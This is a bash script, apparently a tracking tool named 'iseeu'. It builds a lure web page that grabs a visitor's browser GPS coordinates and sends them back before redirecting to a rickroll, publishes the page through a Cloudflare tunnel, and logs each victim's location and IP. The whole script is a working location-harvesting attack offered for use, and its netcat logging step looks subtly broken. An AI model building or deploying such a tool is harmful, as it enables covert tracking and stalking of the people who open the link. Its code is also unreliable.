#!/bin/bash

clear

# Prompt for port
read -p "[?] Enter port to use for local server (default 8080): " PORT
PORT=${PORT:-8080}

WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"
CF_LOG="cf_$(date +%s).log"

echo "[*] Killing existing processes..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f cloudflared 2>/dev/null
pkill -f "nc -l" 2>/dev/null

echo "[*] Creating/clearing directories..."
mkdir -p "$WEB_DIR" "$LOG_DIR"
> "$LOG_FILE"
cd "$WEB_DIR" || exit 1

echo "[*] Creating payload HTML..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
  <title>I See You</title>
  <script>
    function redirectToRickRoll(position) {
      fetch('/logme/' + position.coords.latitude + ',' + position.coords.longitude);
      window.location.href = 'https://shattereddisk.github.io/rickroll/rickroll.mp4';
    }
    function failLocation() {
      alert("Location access denied.");
    }
    navigator.geolocation.getCurrentPosition(redirectToRickRoll, failLocation);
  </script>
</head>
<body>
  <h1>Loading...</h1>
</body>
</html>
EOF

echo "[*] Starting local server on port $PORT..."
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!
echo "[+] Python server running (PID $SERVER_PID)"

echo "[*] Starting Cloudflared tunnel..."
cloudflared tunnel --no-autoupdate --url "http://localhost:$PORT" --logfile "$CF_LOG" > /dev/null 2>&1 &
CF_PID=$!

echo -n "[*] Waiting for Cloudflared URL"
for i in {1..10}; do
  sleep 1
  echo -n "."
  URL=$(grep -oE "https://.*\.trycloudflare\.com" "$CF_LOG" | head -n1)
  if [[ -n "$URL" ]]; then break; fi
done
echo

if [[ -n "$URL" ]]; then
  echo "[✓] Public URL: $URL"
else
  echo "[✗] Failed to get Cloudflared public URL."
  kill $SERVER_PID $CF_PID 2>/dev/null
  rm -f "$CF_LOG"
  exit 1
fi

echo "[*] Logging to $LOG_FILE..."

# Listener for GPS fetch requests
nc -l -p "$PORT" | while read line; do
  if [[ "$line" == *"/logme/"* ]]; then
    GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3)
    IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
    echo "[$(date)] GPS: $GPS | IP: $IP" >> "$LOG_FILE"
  fi
done &
NC_PID=$!

# Handle Ctrl + C
trap 'echo -e "\n[*] Cleaning up..."; kill $SERVER_PID $CF_PID $NC_PID 2>/dev/null; rm -f "$CF_LOG"; echo "[*] Done."; exit' INT

echo "[*] Press Ctrl+C to stop."
wait